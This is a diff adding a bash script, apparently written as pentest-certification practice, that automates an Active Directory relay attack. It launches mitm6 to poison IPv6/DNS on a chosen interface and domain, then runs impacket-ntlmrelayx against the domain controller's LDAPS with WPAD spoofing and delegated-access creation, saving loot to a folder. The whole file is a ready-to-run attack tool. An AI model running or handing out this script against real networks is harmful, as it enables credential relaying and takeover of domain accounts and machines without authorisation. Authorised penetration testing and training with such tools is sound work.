@@ -1,0 +1,83 @@
+#!/bin/bash
+
+#Created by adot
+# Automated script for Active Directory mitm6 and ntlmrelayx attack with delegated access and loot
+# Tools learnt from PEH in preperation for PNPT
+
+#Title
+echo '6ix - written by adot'
+echo
+
+
+dcip=""
+domain=""
+interface=""
+
+help() {
+	echo
+	echo "usage: 6ix [-h] [-t] [-d] [-i] "
+	echo
+	echo "-h			display help message"
+	echo "-t TARGET		domain controller ip"
+	echo "-d DOMAIN		domain name"
+	echo "-i INTERFACE		interface"
+	echo
+	echo "ex: sudo 6ix -t 192.168.1.129 -d WRENCH.local -i eth0"
+	exit 0
+}
+
+
+cleanup() {
+	echo
+	echo " [+] Stopping mitm6"
+	kill $mitm6_pid 2>/dev/null
+	sleep 3
+	echo " [+] Stopping ntlmrelayx"
+	kill $ntlm_pid 2>/dev/null
+	sleep 1
+	exit 0
+}
+
+trap cleanup SIGINT
+
+if [ $# -eq 0 ]
+then
+	echo
+    echo "missing options!"
+    echo "run 6ix -h for help"
+    echo ""
+    exit 0
+fi
+
+# Get the options
+while getopts "ht:d:i:" option; do
+   case $option in
+      h) # display Help
+         help
+         exit;;
+	  t) # Target
+	  	dcip=$OPTARG;;
+	  d) # domain
+	  	domain=$OPTARG;;
+	  i) # interface
+         interface=$OPTARG;;
+	  \?) # Invalid option
+         echo "Invalid option"
+         exit;;
+   esac
+done
+
+if [ ! -d "$domain" ]; then
+	mkdir $domain
+fi
+
+echo " [+] Starting mitm6 on domain $domain"
+sudo xterm -e mitm6 -i $interface -d $domain &
+mitm6_pid=$!
+sleep 2
+echo " [+] Starting ntlmrelayx on target ldaps:\\\\$dcip"
+echo
+impacket-ntlmrelayx -6 -t ldaps://$dcip -wh wpad.$domain --delegate-access -l $domain/lootme
+ntlm_pid=$!
+
+wait $mitm6_pid $ntlm_pid
